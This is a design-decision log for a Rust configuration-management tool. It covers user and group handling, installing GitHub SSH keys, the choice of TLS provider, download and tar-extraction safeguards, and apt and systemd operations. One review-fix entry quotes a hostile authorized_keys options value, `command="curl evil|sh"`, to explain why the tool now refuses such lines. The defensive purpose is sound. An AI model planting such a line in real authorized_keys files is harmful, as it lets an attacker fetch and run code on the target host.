- [M6-sh] 2026-09-08 `user::Present` on BusyBox does not predict (or show in the diff) a shell it was not given: BusyBox `adduser` uses `$SHELL`, else the invoking user's own passwd shell (`/bin/ash` for root on Alpine), else `/bin/sh`, and the op cannot see that environment through `sys` (and under sudo or the M5 helper it differs from the playbook's). An explicit `.shell()` is predicted as before; the previous rule only did this for `system(true)` accounts. Alternative rejected: pin `SHELL=/bin/sh` in the `adduser` environment to make `/bin/sh` true, because it would silently give accounts a different shell from a hand-run `adduser`. Reverse: predict `/bin/sh` again.
- [M6-sh] 2026-09-08 Container tests use distinct user and group names (`rustible-usr`, `rustible-grp`): on Debian `useradd` creates a private group named after the user and refuses when a group of that name already exists, so the brief's literal "`Present::new("rustible-test")` for both" cannot run. Not a code change. Reverse: rename them back to one shared `rustible-test` and the Debian legs fail at `useradd`.
- [M6-sh] 2026-09-08 Found by the container test: `group::Present::new(x)` then `user::Present::new(x)` (the vision 6.1 shape with the group first) fails on Debian with "group x exists - if you want to add this user to that group, use -g", and BusyBox `adduser` dies with "group name 'x' is in use", because both try to create the private group. `user::Present` without `gid` now uses a group named after the new account as its primary group (`useradd -g <gid>`, `adduser -G <name>`), which also makes the gid predictable; in check mode a planned same-named group is accepted the same way. Ansible passes `-N` instead and lands the account in the default group (`users`, gid 100), which nobody asked for. An explicit `gid` still wins. Reverse: drop `same_named_group` and let the tool fail.
- [M6-sh] 2026-09-08 `System::would_create_id_by_name(kind, name)` added next to `would_create_id(kind, id)` so an op can learn the gid an earlier step planned for a group it knows by name. Additive. Reverse: delete the method; `user::Present` then falls back to the by-name branch that blocks prediction.
- [M6-sh] 2026-09-08 `testing::wait_for_systemd` no longer treats `offline` as a terminal state (`stopping` and `maintenance` still are). `systemctl is-system-running` answers `offline` whenever it cannot reach the manager, which includes the first fraction of a second of a container's life, so `it_systemd_image` failed on `jrei/systemd-ubuntu:24.04` about one run in ten with "last state: `offline`" while the same test passed three times in a row after. A dead container is still caught immediately by the `container_running` probe; the only cost is that a non-systemd image now takes the full 60s timeout to be diagnosed instead of failing fast. Found while re-running the whole container suite for this branch; the harness is main's code, not this branch's. Reverse: put `"offline"` back in the terminal arm.
- [M6-sh] 2026-09-08 The BusyBox findings get their own container test, `it_user_busybox` on `alpine:3.20`, instead of an Alpine leg on `it_user_group`: BusyBox is a different toolset (no `usermod` at all), so the Debian test's assertions about `/bin/bash`, `USERGROUPS_ENAB` and `usermod` do not have Alpine equivalents to branch to. It proves the shell finding rather than asserting it: the same `adduser -D` gives `/bin/sh` with no `$SHELL` and `/bin/ash` under `SHELL=/bin/ash`, on one image, in one run. Reverse: delete the file; the BusyBox paths fall back to `Fake` coverage only.
- [M6-gh] 2026-09-08 `UserKeys` fetches `https://github.com/<login>.keys`, not the REST API's `/users/<login>/keys`: the plain-text endpoint needs no token, no JSON parsing and no dependency, and is not under the API's 60-per-hour anonymous limit; the API adds only key ids, which nothing here consumes. Reverse: swap the URL and parse JSON, adding a `serde_json` dependency and a token knob for the rate limit.
- [M6-gh] 2026-09-08 The HTTP call sits behind a crate-local `Fetch` trait (`Https` the default) rather than a new `System`/`Backend` primitive: `System` models the target machine's files and processes (vision 7) and the SDK deliberately has no network, so a collection that needs one owns its seam. This is the shape a third-party collection should copy. Reverse: add a `get` primitive to `Backend` and drop `Fetch`.
- [M6-gh] 2026-09-08 `keys_to_user` / `KeysToUser` is **additive** by default; `.exclusive(true)` is opt-in and Ansible's `exclusive` default (false) agrees. Additive can never lock anyone out, which is the failure mode that matters for `authorized_keys`. Reverse: flip the default in `KeysToUser::new`.
- [M6-gh] 2026-09-08 In exclusive mode an empty key list is a hard error, not an empty `authorized_keys`: a user deleting their GitHub keys must not lock the account. Ansible would truncate. `ssh::authorized_keys::Present` is still reachable directly for anyone who really wants it. Reverse: drop the `bail!` and let `Present` truncate.
- [M6-gh] 2026-09-08 Keys are installed with the comment `github:<login>` (the `.keys` endpoint strips comments), overridable with `.comment(..)` or `.without_comment()`. Comments never take part in matching, so changing it does not rewrite existing lines. Reverse: default `comment` to `None`.
- [M6-gh] 2026-09-08 A 404 fails the step naming the user, while a 200 with an empty body is a successful empty `Vec`: a typo must not silently install nothing, but a real user with no keys is a legitimate state. A body line that is not a public key fails rather than being skipped, since a dropped key under `exclusive` is a lockout. Reverse: map 404 to an empty list and skip unparseable lines.
- [M6-gh] 2026-09-08 The login is validated against GitHub's rules (1-39 chars, ASCII alphanumerics and single interior hyphens) in `check`, before any request, so a playbook typo fails locally with a message instead of as a 404. Validation is in `check`, not `of()`, because constructing an op cannot fail (vision 6.2). Reverse: delete `validate_login` and let GitHub answer.
- [M6-gh] 2026-09-08 `KeysToUser` is a plain helper running two `ctx.step`s, not an `Op`: the fetch and the install stay visible as separate lines in the run report. This is the recommended way for a collection to compose without hiding work. Reverse: make it a single `Op` whose `check` fetches.
- [M6-gh] 2026-09-08 `ureq` is taken with `default-features = false` plus `rustls-no-provider` and `rustls-webpki-roots`, and the crypto provider is `rustls-rustcrypto`: ureq's default rustls feature pulls `ring`, which is C (vision 5.3 forbids it). Trust roots are the bundled webpki set, so no system certificate store is read. Note `rustls-rustcrypto` is `0.0.2-alpha` and slower than ring; it is the only pure-Rust provider today. Reverse: enable ureq's default rustls feature and accept `ring`.
- [M6-gh] 2026-09-08 The default client caps a response body at 1 MiB and uses a 20-second connect/read timeout (`.timeout(..)` overrides), and sends a `rustible-github/<version>` user agent because GitHub rejects requests without one. Reverse: raise or drop the cap in `fetch::MAX_BODY_BYTES`.
- [M6-gh] 2026-09-08 Exactly one test crosses the network and it is `#[ignore]`d, so `cargo test` is deterministic and offline everywhere including CI; run it with `cargo test -p rustible-github -- --ignored`. Reverse: none wanted.
- [M6-gh] 2026-09-08 PROPOSED AMENDMENT for Cadu, security-relevant: the only pure-Rust rustls crypto provider today is `rustls-rustcrypto`, published at `0.0.2-alpha`, and vision 5.3's no-C rule makes it the only option for any op that speaks TLS (`github::UserKeys` here, `http::Download` in the sibling branch). That means SSH public keys are fetched, and files are downloaded, through an alpha TLS implementation. The alternatives are: accept it knowingly for now, keep the network ops but mark them experimental, or drop network ops until a mature pure-Rust provider exists. Not decided by an agent. Reverse: enable ureq's default rustls feature, which pulls `ring` (C) and breaks the pure-Rust rule. **DECIDED by Cadu 2026-09-08: none of the three. A second pure-Rust provider exists, `rustls-graviola`, which the amendment did not know about; the project switches to it and drops `rustls-rustcrypto` entirely.** See the `[M7-tls]` entries below for the swap, the no-fallback decision and its hardware cost, and the CPU pre-flight.
- [M6-sh] 2026-09-08 Review finding: because `user::Present` adopts a same-named group as the new account's primary group (`useradd -g`), `user::Absent` can later remove that group, since `userdel` takes a primary group that shares the account's name and has no other members (`USERGROUPS_ENAB`, the Debian and Ubuntu default). So `group::Present::new("app")`, `user::Present::new("app")`, `user::Absent::new("app")` deletes group `app` although no step asked for it. Accepted rather than worked around: the alternative is Ansible's `useradd -N`, which suppresses the private group and lands the account in the system default group (`users`, gid 100), and a surprising group membership is worse than a surprising group removal that the account's own name invited. Documented in the `user::Absent` rustdoc under "A group named after the account can go with it", with the workaround (give the group another member or another name); `it_user_group` asserts the outcome. Reverse: pass `-N` in `Present::create` when the primary group came from `same_named_group` rather than from an explicit `gid`, and drop the rustdoc section.
- [M6-gh] 2026-09-08 `parse_keys_body` refuses a line carrying an `authorized_keys` options field and strips comments, so `UserKeys`' output matches its documented contract (`options` and `comment` both `None`). Found by the post-merge review: `ssh::authorized_keys::parse_line` deliberately reads a leading non-key-type token as sshd's options field, so a response from anything that is not github.com unaltered (a proxy, a caching layer, a GitHub Enterprise host, or an attacker who can answer for one) could put `command="curl evil|sh"` into the target's `authorized_keys` and the run would report a clean `changed`. Reverse: accept the options field and pass it through.
- [M6-gh] 2026-09-08 `KeysToUser` sets its comment unconditionally now that comments are stripped at parse time, so `.comment(..)` can no longer be silently ignored for a key whose upstream line happened to carry one. Reverse: restore the `if k.comment.is_none()` guard.
- [M6-gh] 2026-09-08 `UserKeys::base_url(..)` exists, because the `Fetch` docs promised a GitHub Enterprise escape hatch the API did not provide: the URL was a hardcoded const, so an implementor had to string-rewrite the host out of a github.com URL. The options-field refusal applies to a custom base exactly as it does to github.com. Reverse: drop the builder and reword the docs to say the URL is fixed.
- [M6-gh] 2026-09-08 `Https` builds its `ureq::Agent` once instead of per request: an agent owns its connection pool and its lazily built rustls `ClientConfig`, so a per-request agent re-parsed the whole bundled root store and threw away keep-alive; a playbook installing keys for twenty accounts paid for twenty. Reverse: build it in `get`.
- [M6-gh] 2026-09-08 `validate_login` checks the character set before the length and counts characters rather than bytes, so a non-ASCII login is told which character is wrong instead of a byte count the author never typed. Reverse: swap the order back.
- [M6-gh] 2026-09-08 `rustible-github` no longer names `rustls` as a direct dependency: nothing in the crate uses a `rustls::` path (the provider comes from `rustls-rustcrypto`) and the features it asked for are a subset of ureq's. `rustible-std` keeps its entry, because `http::tls_provider` does name the type. Reverse: re-add it.
- [M6-gh] 2026-09-08 AMENDMENT DETAIL for Cadu, added to the TLS entry above: `rustls-rustcrypto`'s own README says "USE THIS AT YOUR OWN RISK! DO NOT USE THIS IN PRODUCTION" and notes that neither it nor rustls is formally verified. It is the only thing authenticating github.com before those bytes become entries in a user's `authorized_keys`, so it is the trust root for this crate's whole purpose. The code shipped to main before the call was made; the call is still open.
- [M6-na] 2026-09-08 `http::Download`'s TLS crypto provider is `rustls-rustcrypto` (0.0.2-alpha), wired through `ureq`'s `rustls-no-provider` feature. rustls's default providers `ring` and `aws-lc-rs` bundle C: `cargo build --target aarch64-unknown-linux-musl` of a `ureq` + `ring` probe fails here ("failed to find tool aarch64-linux-musl-gcc"), the exact failure vision 5.3 describes; the rustcrypto build links with rust-lld and downloads from github.com over TLS 1.3. `rustls-graviola` also links but requires AVX2/BMI2/ADX on x86_64 and AES/PMULL on aarch64 at runtime (excludes pre-2014 x86 CPUs and Raspberry Pi 4), which a fleet op cannot assume. The alpha label is on the rustls glue; the primitives are RustCrypto's `aes-gcm`, `chacha20poly1305`, `p256`, `x25519-dalek`, `rsa`, `sha2`. Reverse: change `http::tls_provider()` to `rustls_graviola::default_provider()` (one line) or, when a pure-Rust provider graduates, to that.
- [M6-na] 2026-09-08 `ureq` is pulled with `default-features = false` (no `gzip`): the client sends no `Accept-Encoding`, so a `.tar.gz` arrives as stored and is never transparently inflated into `dest`. Reverse: enable the `gzip` feature and accept that `Content-Encoding: gzip` bodies are inflated.
- [M6-na] 2026-09-08 New crates are declared in `[workspace.dependencies]` (`ureq`, `rustls`, `rustls-rustcrypto`, `sha2`, `tar`, `flate2`, `lzma-rust2`, `ruzstd`) so `rustible-github` can take the same `ureq` configuration with `ureq.workspace = true`; `rustible-cli` keeps its own `sha2 = "0.10"` line (same resolved version, not touched, per "do not touch the CLI"). Reverse: move the lines into `crates/rustible-std/Cargo.toml`.
- [M6-na] 2026-09-08 `http::Download::check` never touches the network and predicts its report only for an attributes-only change; when a download is due the plan carries the diff alone, because size and digest are unknown until fetched (vision 12: no invented values). A check-mode run that reads the step's output stops with the vision's message. Reverse: predict with `bytes: 0` and the requested checksum, documented as a placeholder.
- [M6-na] 2026-09-08 `http::Download` semantics follow Ansible `get_url`: an existing file with a matching `.checksum` is `ok` even with `.force(true)`; an existing file without a checksum is `ok` unless `.force(true)`; a mismatching checksum on disk re-downloads. Documented in a table on the type. Reverse: make `force` win over a matching checksum.
- [M6-na] 2026-09-08 `http::Download` accepts `sha224`, `sha256`, `sha384`, `sha512` (the `sha2` crate already in the lock) and refuses `md5` and `sha1` by name; Ansible's `checksum: sha256:<url>` (digest fetched from a URL) is not supported. The report always carries the file's SHA-256, so `check` reads and hashes an existing file even without a checksum (one read per run). Reverse: add `md-5`/`sha1`, or make `sha256` an `Option`.
- [M6-na] 2026-09-08 `http::Download` holds the body in memory before `write_atomic`, because `Backend::write` takes `&[u8]` and there is no streaming write primitive; documented as "release tarballs, not disk images". ureq's default 10 MB body limit is lifted. Reverse: add `Backend::write_atomic_from(&mut dyn Read)` and stream to the temp file.
- [M6-na] 2026-09-08 `http::Download` refuses a missing parent directory at `check` naming `file::Directory` (vision 6.7) and a `dest` that is not a regular file, like `file::Copy`. `file://` URLs are refused pointing at `Copy::from_local_path`. `.timeout` covers connect and response headers (default 30 s), not the body, so a slow large download is not cut. `.header(name, value)` is offered because GitHub release assets need `Accept`. Reverse: n/a (additive).
- [M6-na] 2026-09-08 `archive::Extracted` supports tar, tar.gz, tar.xz and tar.zst through `tar`, `flate2` (miniz_oxide), `lzma-rust2` and `ruzstd`, all pure Rust. bzip2 is refused with a message naming the supported set: not in the brief, and the only pure-Rust decoder (`bzip2` with its `libbz2-rs-sys` backend) was not evaluated. zip is refused the same way: `unarchive` handles it, but zip has different semantics (no modes on many members, no symlinks) and the brief says tar. Reverse: add `Format::TarBz2` on `bzip2 = { default-features = false, features = ["libbz2-rs-sys"] }` after checking it cross-links; zip needs a design.
- [M6-na] 2026-09-08 `archive::Extracted` detects the format from magic bytes, then checks for a `ustar` header block after decompression, so a gzipped text file is refused as "the tar.gz stream does not contain a tar archive" instead of a `tar` crate error. Old V7 tars without the `ustar` magic are refused as unrecognised. Reverse: accept any 512-byte block with a valid checksum.
- [M6-na] 2026-09-08 `archive::Extracted::check` decompresses and walks the whole archive (no writes) so the report's counts are exact and every refusal fires before anything is written; `apply` walks it a second time. The cost is two decompressions per changed run, paid for an honest check mode and an all-or-nothing guard. Reverse: check only the first block and validate members as they are written.
- [M6-na] 2026-09-08 Tar-slip guards in `archive::Extracted`, all at `check` and naming the member: absolute paths and `..` components (Ansible/GNU tar strip and warn); symlink members with an absolute target or a relative one climbing above `dest` (GNU tar allows both; a later member or step writing through such a link lands outside `dest`); members under an earlier symlink member; hard links to a file the archive did not extract before them; device, fifo and other special members; and on disk, any directory on a member's path that is a symlink, a file where a directory goes, a directory where a file or symlink goes. Reverse: per guard, drop the branch in `walk` or `check_destination`.
- [M6-na] 2026-09-08 `archive::Extracted` writes hard links as copies of the already extracted file (read back through `sys`), because `Backend` has no `hard_link` primitive and the brief forbids SDK changes. Ownership recorded in the archive is ignored (`.owner(uid, gid)` sets one owner on files and directories; symlinks are skipped because `set_owner` follows links); modification times are not restored (no primitive). Reverse: add `Backend::hard_link` and `set_mtime`.
- [M6-na] 2026-09-08 `archive::Extracted` without `.creates` re-extracts every run and reports `always_changes`, as the brief asks; Ansible's `tar --diff` comparison is not reproduced. A relative `creates` is taken under `dest`. After `apply`, a `creates` marker that still does not exist produces a warning (not a failure) naming it, since the next run would extract again. Reverse: fail instead of warn; or compare member digests against disk to be state-like.
- [M6-na] 2026-09-08 zstd is decompressed fully into memory with a frame loop over `ruzstd::FrameDecoder` (skippable frames skipped, content checksum verified when present) because `ruzstd::StreamingDecoder` stops after the first frame and `pzstd`/`--rsyncable` write several; gzip and xz stream through `MultiGzDecoder` and `XzReader`. Reverse: wrap the frame loop in a `Read` adapter.
- [M6-na] 2026-09-08 Archive fixtures (`crates/rustible-std/fixtures/archive/hello.tar{,.gz,.xz,.zst}`, one tree in four encodings, under 11 KB together) are checked in rather than generated at test time: generating xz and zstd needs encoders (`zstd` is C, `lzma-rust2`'s encoder is another feature) and the fixtures are what a real `tar`/`xz`/`zstd` wrote, which is what the op must read. Generation commands are recorded in the archive tests. Reverse: build the fixtures in `build.rs` or in the tests with the pure-Rust encoders.
- [M6-na] 2026-09-08 `file::apply_attrs` changed from private to `pub(crate)` so `http::Download` shares it with `file::Copy`; the only edit to another module. Reverse: duplicate the six lines.
- [M6-na] 2026-09-08 The `http::Download` container test serves the file from a loopback `TcpListener` inside the container (the harness gives the container default networking, but the test must not depend on it), so it covers plain HTTP end to end; TLS through rustcrypto is covered by the `#[ignore]`d unit test `https_download_from_github_with_rustcrypto_tls`, run by hand and logged in the done file. Reverse: add an HTTPS route with a self-signed certificate once the harness can pass a CA into `Download` (needs a `.ca_cert` option).
- [M6-na] 2026-09-08 Merging `rustible-github` (PR 14) into this branch left two identical `[workspace.dependencies]` blocks for `ureq`, `rustls` and `rustls-rustcrypto`; they converged on one, the github branch's, because both sides already agreed byte for byte on version and features (`ureq` `default-features = false` + `rustls-no-provider` + `rustls-webpki-roots`, `rustls` `default-features = false` + `std` + `tls12`, `rustls-rustcrypto = "0.0.2-alpha"`). The comment above them now names both consumers. The archive-only crates (`sha2`, `tar`, `flate2`, `lzma-rust2`, `ruzstd`) stay in their own block below. The `rustls-rustcrypto` alpha question is recorded once, as the `[M6-gh]` proposed amendment for Cadu, and covers `http::Download` too. Reverse: split the block again, one per consumer crate.
- [M6-na] 2026-09-08 REVIEW FIX, public API change: `DownloadReport::sha256` becomes `Option<String>`, `None` when no `.checksum` was configured and the file was already in place. `check` previously read and SHA-256'd the whole destination on every run, check mode included, only to fill that field, which is a full read and digest of a 500 MB tarball per run for a value that decided nothing. The digest is now computed only when a checksum makes it decide something, and after a download it is always `Some`. Acceptable at 0.0.1, before anyone writes against the type. Pinned by `http::tests::check_hashes_the_destination_only_when_a_checksum_asks_for_it`. Reverse: make the field `String` again and hash unconditionally in `content_state`.
- [M6-na] 2026-09-08 REVIEW FIX, security: `file::apply_attrs` and `archive::Extracted::write_member` now `chown` before they `chmod`. Linux's `chown(2)` clears `S_ISUID`/`S_ISGID` on anything that is not a directory, so the old order silently turned a `.mode(0o4755).owner(..)` download, or a setuid member of an archive, into a plain 0755 file while reporting success. Pinned by container tests on both images ("download a setuid helper", "extract a setuid member with an owner"), which fail with mode 0755 if the order is swapped back; the `Fake` cannot catch this because it does not model chown's bit-clearing. Reverse: swap the two blocks back, and delete both container cases.
- [M6-na] 2026-09-08 REVIEW FIX, security: `http::Download` gains `.max_bytes(u64)` with a default of `DEFAULT_MAX_BYTES` (1 GiB). ureq's own 10 MB cap had been lifted with `u64::MAX` and nothing put in its place, so an endless or hostile response filled the target's memory (the body is buffered before the atomic write). A `Content-Length` over the limit fails before the body is read; without one, ureq's `limit` stops the read one byte past the ceiling. 1 GiB because the op already buffers in memory and is documented for release tarballs. Reverse: drop the builder and pass `u64::MAX` again.
- [M6-na] 2026-09-08 REVIEW FIX, security: `archive::Extracted` clamps the buffer capacity it reserves from a tar header's `size` to `READ_CAPACITY_CEILING` (1 MiB) and lets `read_to_end` grow it. The field is attacker-controlled: a base-256 `size` of 2^62 asked for a 4.6 EB allocation, and Rust aborts the process on allocation failure, so a crafted archive killed the run instead of drawing a refusal. `check` alone does not reach it (the walk fails on the short stream first), but `apply` re-reads the file and reaches it on an archive swapped in between. `report()` also sums those sizes with `saturating_add` now, since the sum overflows and panics in a debug build. Reverse: pass `m.size` straight to `Vec::with_capacity` and use `+`.
- [M6-na] 2026-09-08 REVIEW FIX: `http::validate_url` measured its length floor against `"https://"` for both schemes, so the valid `http://x` was refused. Single-label hosts are real (an `/etc/hosts` name, a container alias). It now measures against the scheme that matched. Reverse: n/a (a plain bug).
- [M6-na] 2026-09-08 REVIEW FIX: `archive::Extracted`'s walk now refuses two members of the archive colliding on one path, at `check` with the other refusals. The case is `d/` then `d/f` then `d` as a symlink: `apply` created and populated the directory, then could not remove it, aborting partway and leaving a half-written tree. Two guards: the same path claimed as two different kinds, and a non-directory member at a path earlier members populated (which covers directories the archive never listed explicitly). The same path repeated as the same kind stays legal, as in GNU tar, last one winning. Reverse: delete both branches in `walk`.
- [M6-na] 2026-09-08 REVIEW FIX: `ExtractReport::bytes` documented hard links as counted again, which the code never did (their headers carry `size == 0`). The doc now says what the field is, the archive's declared content size rather than what lands on disk, since resolving each hard link's target size would mean a second pass to report a number nobody depends on. Reverse: resolve the target's size in `report()` and restore the old wording.
- [M6-sh] 2026-09-08 The `Local::spawn` stdin test is bounded by a 30-second timeout on a worker thread: it pins a deadlock, so without a bound a regression hangs instead of failing, and in CI it would hold the job until the workflow timeout rather than naming what broke. Found by the M5 agent when it reverted the fix to check its own helper-boundary test and watched main's run past sixty seconds. Reverse: assert inline again.
- [M7-amend] 2026-09-08 init: `rustible init` refuses only on **conflicting files**, not on a non-empty directory, settling the `[M4]` proposed amendment above by Cadu's decision. A file is a conflict when `init` would itself write it: `Cargo.toml`, `build.rs`, `src/main.rs`, `src/lib.rs`, `.cargo/config.toml`, `hosts.kdl`, `rustible.toml` (the list is `GENERATED_PATHS`, kept equal to `generate()`'s paths by a test). Everything else in the directory is left alone and never read, so a fresh clone with a README, a LICENSE and a `.gitignore` now works without `--force`. `.gitignore` is not a conflict because it is appended to, nor is `playbooks/.gitkeep` because it is only created when missing. A dangling symlink counts as present (`symlink_metadata`, not `exists`). The error names the clashing files in write order. `--force` keeps its old meaning: add the missing files, keep user-owned ones, rewrite the two shims. The `.git`-only emptiness exception is gone, since `.git` was never a file `init` writes. Contradicted vision 3; the vision doc was amended to match in PR #24 (e42900e) and the handover patch deleted. Reverse: restore `is_empty_dir` and the `is not empty` bail in `init::run`, delete `conflicts`, `GENERATED_PATHS` and the three tests that pin them.
- [M7-amend] 2026-09-08 apt::Latest: the `.update_cache(max_age)` refresh moves from `apply` to `check`, settling the `[M6-so]` proposed amendment above by Cadu's decision. `Latest` reads candidate versions from the package lists, so a stale list makes its whole answer wrong rather than merely stale; `check` now runs `apt-get update` before `apt-cache policy`, which is what Ansible's `apt: state=latest` does. `apply` no longer refreshes at all: `check` always runs first (the plan it returns is what `apply` receives), so the candidates are already fresh and the old double refresh under `Duration::ZERO` is gone. **The honest cost: a `--check` run with `.update_cache(...)` writes `/var/lib/apt/lists` on the target.** It is a command rather than a mutation through `sys`, so the check-mode guard in vision 7.3 does not stop it. Three things keep that from being a silent lie: it happens only when the caller asked for `.update_cache(...)`, the module and op rustdoc say it plainly, and the op logs a `Warn` event naming `/var/lib/apt/lists` when it happens in check mode (a `Debug` event outside check mode, where the refresh is unremarkable). `apt::Present` is unchanged: dpkg answers its question without the lists. Contradicted vision 6.8; edit in the patch file, hunk 4. Reverse: move the `refresh_cache` call from `Latest::check` back into `Latest::apply`, drop the warning, and restore the two rewritten unit tests.
- [M7-amend] 2026-09-08 systemd::DaemonReload: a seventh systemd op, settling the `[M6-sd]` proposed amendment above by Cadu's decision. An action in the sense of vision 6.4: `check` always returns `Change`, runs nothing and predicts nothing, `always_changes()` is true, and it names no unit. `apply` runs `systemctl daemon-reload`, or `systemctl --user daemon-reload` with `.user(true)`. Same guards as the other six (non-systemd init refused, root required unless `.user(true)`), reached by splitting `Unit::guard` into the unit-name half and a `guard_manager` half that an op with no unit can use; `Unit::manager()` builds the no-unit `Unit` that carries only the `--user` choice. **Output type `()`**, chosen over `UnitState` (which needs a unit this op does not have) and over a struct echoing the `--user` flag (an input dressed as an output); after a daemon-reload the manager exposes nothing worth reading back. `Default` is implemented as `new()` only to satisfy clippy's `new_without_default`, and a test pins them equal. `tests/it_systemd.rs` used to reload `systemd-journald` purely to carry a `.daemon_reload(true)` flag; it now uses the new op, which is the container proof it works. Contradicted vision 6.4, the 6.3 op table and the 6.9 wave-one list; edits in the patch file, hunks 2, 3, 5 and 6. Reverse: delete the `DaemonReload` block in `systemd.rs` and its five tests, fold `guard_manager` back into `guard`, drop `Unit::manager`, and put the journald reload back in the container test.
- [M7-tls] **SUPERSEDED 2026-09-08 by the `[M7-ring]` entries below**, which move the provider to `ring` after `docs/plan/reports/C-TOOLCHAIN-SPIKE.md` measured what the no-C rule was actually buying. The entry stands as written for the history. 2026-09-08 The TLS crypto provider is `rustls-graviola` 0.4; `rustls-rustcrypto` is removed from the workspace, both crate manifests and the lock. Decided by Cadu on the research in `docs/plan/reports/TLS-OPTIONS.md`. Graviola keeps vision 5.3 intact (zero `.c`, zero `.S`, zero `build.rs`; its only dependencies are `cfg-if` and `getrandom`) and cross-builds for both musl targets with stock rustup and `rust-lld`, verified here by building and running a static musl binary against `https://github.com/flipbit03.keys` on x86_64 and on the ARM VM. It replaces an unreleased `0.0.2-alpha` whose own README says not to use it in production, and whose P-256/P-384 arithmetic has never been audited, with a 0.4 release from the rustls author built on the formally proven s2n-bignum, constant-time-tested with ctgrind in CI. Reverse: put `rustls-rustcrypto = "0.0.2-alpha"` back in `[workspace.dependencies]` and in both crate manifests, and return `Arc::new(rustls_rustcrypto::provider())` from `rustible_std::tls::provider`.
- [M7-tls] **PARTLY SUPERSEDED 2026-09-08 by `[M7-ring]` below.** One crypto path with no fallback is still the rule; the hardware cost this entry accepts is gone, because ring has no CPU floor. 2026-09-08 **No fallback provider and no runtime downgrade**: one crypto path, one thing to reason about. Cadu chose option (2) of the research report's section 7 over the hybrid it verified. The cost is real and is the price of the decision: `http::Download` and `github::UserKeys` cannot run at all on x86_64 CPUs older than Intel Broadwell (Haswell has avx2 and bmi2 but no adx) or on aarch64 cores without the ARMv8 crypto extensions, which is Raspberry Pi 4 and earlier. Those machines get a failed step, not a downgraded cipher suite. Every non-network op is unaffected. Reverse: re-add `rustls-rustcrypto`, and have `rustible_std::tls::provider` return it when `missing_cpu_features()` is non-empty instead of `preflight` erroring; the research verified both providers coexist in one static musl binary.
- [M7-tls] **SUPERSEDED 2026-09-08 by `[M7-ring]` below**: the pre-flight is deleted, because ring detects at runtime and never asserts. 2026-09-08 A CPU pre-flight (`rustible_std::tls::preflight`) runs before every HTTPS request, in `http::Download::fetch` and in `github::fetch::Https::get`. Graviola enforces its requirements with `assert!` at its first crypto call, so without this a machine below the floor panics inside the handshake and takes the whole playbook down instead of failing one step. The required set is read from graviola's own `verify_cpu_features()` rather than its README: on x86_64 `aes, pclmulqdq, bmi1, adx, avx, avx2` (the README also lists `ssse3` and `bmi2`, but a comment in the source says `ssse3` is implied by `avx`, and `bmi2` is an optional token type, not an assertion, so neither can cause the panic); on aarch64 `neon, aes, pmull, sha2`. Reverse: delete `crates/rustible-std/src/tls.rs`, inline `Arc::new(rustls_graviola::default_provider())` at both call sites, and accept the panic.
- [M7-tls] **PARTLY SUPERSEDED 2026-09-08 by `[M7-ring]` below**: the shared module survives, holding the provider alone. 2026-09-08 The pre-flight and the provider live in one shared module, `rustible_std::tls`, rather than being duplicated: `rustible-github` already depends on `rustible-std`, so there is no new dependency edge, and the two crates cannot drift apart on what the CPU floor is. `rustible-github` consequently has no crypto dependency of its own at all; `rustible-std` keeps its direct `rustls` entry because `tls` names `rustls::crypto::CryptoProvider`. This is also the shape a third-party collection should copy. Reverse: give `rustible-github` its own `rustls-graviola` entry and a copy of the check.
- [M7-tls] **SUPERSEDED 2026-09-08 by `[M7-ring]` below**: with graviola gone the MSRV is back at 1.88. 2026-09-08 `rust-version` raised from 1.88 to 1.89, and CI's MSRV job with it, because `graviola` 0.4.1 declares `rust-version = 1.89` and `cargo +1.88 check` refuses to build the workspace. Every graviola from 0.3.0 (August 2025) onwards declares 1.89; only 0.2.1 and earlier are on 1.72, and `rustls-graviola` 0.4 requires graviola 0.4, so pinning back is not available. 1.89 shipped 2025-08-04, over a year before this change. Not predicted by the research report. Reverse: revert both, which means reverting the whole provider swap.
- [M7-tls] **SUPERSEDED 2026-09-08 by `[M7-ring]` below**: there is no unsupported-CPU branch any more. 2026-09-08 The unsupported-CPU branch is tested at the function (`tls::tests::the_error_names_the_feature_the_op_and_the_rule` calls `unsupported_cpu` with a fabricated missing list), not end to end. Graviola's `GRAVIOLA_CPU_DISABLE_<feature>` debug toggle suppresses graviola's own detection and not `std::arch`'s, so setting it would produce exactly the panic the pre-flight exists to prevent rather than the error under test. The detection half is checked against `/proc/cpuinfo` in `tls::tests::detection_agrees_with_cpuinfo`, an independent source rather than the macro checking itself. Reverse: n/a; if graviola ever exposes a non-debug override, drive the whole path with it.
- [M7-tls] **SUPERSEDED 2026-09-08 by `[M7-ring]` below**: with the pre-flight gone there is nothing to gate. 2026-09-08 REVIEW FIX: the pre-flight is gated on the URL scheme (`tls::preflight_url`), not applied to every request. `http::Download` documents both `http://` and `https://` and its own container test downloads over plain HTTP, which never reaches the crypto provider; `github::UserKeys` takes a `.base_url(..)` that may be a plain-HTTP mirror. Without the gate, a sub-floor machine had a working plain-HTTP download refused, with a message about HTTPS that did not describe the request, which is exactly the "refuse a machine that would have worked" failure the check exists to avoid. The scheme match is byte-wise (`split_at_checked` + `eq_ignore_ascii_case`) because `&url[..8]` panics on a URL whose eighth byte is inside a multi-byte character. Pinned by `tls::tests::only_https_urls_are_gated` and `tls::tests::plain_http_is_never_refused`. Reverse: call `preflight` unconditionally at both call sites.

- [M5] 2026-09-08 The escalation method reaches the binary as `HostInfo.escalate_method` (serde default `sudo`), not as a new `Start` field: `HostInfo` already carries `escalate_user` and vision 11.1 makes it the home of target-relevant parameters. Reverse: move the field to `Start`.
- [M5] 2026-09-08 Byte fields on the wire (`FileChunk`, `FetchChunk`, helper frames, `CmdSpec.stdin`, `Output`) are base64 strings via the `base64` crate, not JSON number arrays (3.5x the payload for a 50 MB file over SSH). Frame bodies are zeroized after decoding. Reverse: drop the `#[serde(with = "b64")]` attributes.
- [M5] 2026-09-08 EOF on stdin in `--remote` mode cancels the run (reason "the orchestrator closed the channel"): with the orchestrator gone nobody receives the report, so stopping between steps beats a blind run. Reverse: make `Feeder::close` only close the inbox.
- [M5] 2026-09-08 `ctx.fetch(remote, "out/")` (trailing slash) lands at `out/<host name>/<file name>` so several hosts do not overwrite each other, as Ansible's `fetch` does; a destination without a trailing slash is used verbatim. Reverse: drop the host segment.
- [M5] 2026-09-08 `ctx.fetch` reads the remote file through `sys.read` in one piece (so an escalated `Ctx` fetches what its identity can read) and chunks it afterwards; the helper frame limit caps an escalated fetch at 64 MiB. Reverse: add a streaming read primitive to `Backend`.
